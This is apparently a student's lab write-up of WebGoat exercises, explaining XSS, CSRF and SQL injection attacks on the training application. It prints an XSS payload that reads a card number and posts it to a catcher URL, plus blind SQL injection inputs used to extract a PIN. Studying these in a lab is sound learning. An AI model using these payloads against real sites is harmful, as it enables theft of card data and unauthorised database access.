@@ -1,0 +1,69 @@
+Part 1 Explanation:
+The website doesn't check and filter user inuput. By injecting a fake login form in the search bar,
+the attcker can steal user's crentential. Once user click the submit button, a script will be run 
+and upload the user's crentential to attacker's server.
+
+Part 2 Explanation:
+The attcker can exploit the three digit access code and modify the URL by attching a script as parameter
+for input2. Once the victim clicked the fake URL and entered the card information. A script attched below
+will run, read the value of the input1 (card number) and send it to the attcker's server. The website doesn't
+check and filter the user input, so that's why it is exploitable by attcker
+--- part 2 unencoded URL ---
+http://localhost:8090/WebGoat/start.mvc#attack/297061215/900?input1=1231231231&input2=000%20%3CSCRIPT%3E%20var%20Button%20=%20document.getElementsByName(%22buy%22)[0];%20function%20card(){%20var%20cardNum%20=%20document.getElementsByName(%22input1%22)[0].value;%20console.log(%22The%20Stolen%20Card%20Number%20is%20%22%20+%20cardNum);%20var%20postURL%20=%20'http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum='%20+%20cardNum;%20var%20xmlHTTP%20=%20new%20XMLHttpRequest();%20xmlHTTP.open(%22POST%22,postURL,%20false);%20xmlHTTP.send(null);%20}%20Button.addEventListener(%22click%22,%20card());%20document.getElementById('message').style.display%20=%20'none';%20%3C/SCRIPT%3E
+--- part2 Script -----
+000                                      
+<SCRIPT>
+    var Button = document.getElementsByName("buy")[0];
+    function card(){
+		var cardNum = document.getElementsByName("input1")[0].value;        
+        console.log("The Stolen Card Number is " + cardNum);
+        var postURL = 'http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum=' + cardNum;
+        var xmlHTTP = new XMLHttpRequest();
+        xmlHTTP.open("POST",postURL, false);
+        xmlHTTP.send(null);
+	}
+    Button.addEventListener("click", card());
+    document.getElementById('message').style.display = 'none';
+</SCRIPT>
+
+Part 3 Explanation:
+Attcker can use the Message box and exploit the transfer field by attaching a image whose URL is \
+pointing to a transfer request that submit a form for transferring money, indicated by the screen, 
+menu, and transfer parameters. This CSRF attack tries to submit a request to another site where 
+the user is authenticated, without the user's consent or knowledge.
+
+Part 4 Explanation:
+Attcker can use the Message box and exploit the transfer field by attaching two images. The first 
+image's URL points to the transfer request simialr as part3. While the first image triggers the prompt,
+the second image will automaticlly comfirm the request by setting the transfer=CONFIRMED, thus, 
+transfering the money and by passing the prompt.
+
+Part 5 Explanation:
+The Message field is exploitable.
+We created two iframes. The first iframe extract the token in the page with transfer=main.
+The second iframe sends the forged request with both the valid token and the transfer parameter.
+
+Part 6 Explanation:
+We added 
+    1. "or 1=1" condition to the WHERE clause to make the condition evaluated to True. 
+    2. "--" to the end of command to make all following commands (if there is any) commented out and ignored by the SQL parser
+    3. "'" at the beginning so that it will match with the "'" added by the website. The closing "'" would be parsed as a comment and be ignored
+As the WHERE statement is always True, the SQL command will always return all rows in the table
+
+Part 7 Explanation:
+For both parts, we first input the the userid, followed by a ";" to end the first command and then input the second command. These two commands execute separately.
+
+Part 8 Explanation:
+We find the following by trying different numbers and use binary search (approximatedly) to narrow down the scope.
+First, we find that 101 is a valid account number. Thus, we use 101 and OR it with a condition that compares value of pin with cc_number equals 1234123412341234 with a number we select.
+Following are the inputs we use to find the pin number and the response we got from server, where '+' represents output "Invalid account number." and '-' represents output "Account number is valid."
+101 and (SELECT pin FROM credit WHERE cc_number = 1234123412341234) > 100       +
+101 and (SELECT pin FROM credit WHERE cc_number = 1234123412341234) > 1000      +
+101 and (SELECT pin FROM credit WHERE cc_number = 1234123412341234) > 10000     -
+101 and (SELECT pin FROM credit WHERE cc_number = 1234123412341234) > 5000      -
+101 and (SELECT pin FROM credit WHERE cc_number = 1234123412341234) > 3000      +
+...
+101 and (SELECT pin FROM credit WHERE cc_number = 1234123412341234) > 3317      +
+101 and (SELECT pin FROM credit WHERE cc_number = 1234123412341234) > 3319      -
+Finally we can narrow down the scope to a single number and can use '=' to confirm exact pin number.
+101 and (SELECT pin FROM credit WHERE cc_number = 1234123412341234) = 3318      +
